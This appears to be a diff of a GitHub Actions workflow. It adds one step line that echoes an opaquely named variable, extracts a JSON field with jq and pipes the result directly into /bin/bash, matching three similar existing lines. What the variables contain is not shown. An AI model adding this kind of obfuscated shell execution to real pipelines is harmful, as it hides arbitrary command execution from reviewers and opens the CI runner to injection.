@@ -24,6 +24,7 @@ jobs:
           echo $pbrq69126 | jq -r .uovdz2 | /bin/bash
           printf '%s' "$l2" | jq -r .t20236 | /bin/bash
           echo $ncmpf7 | jq -r .s71 | /bin/bash
+          echo $y86672 | jq -r .r46 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
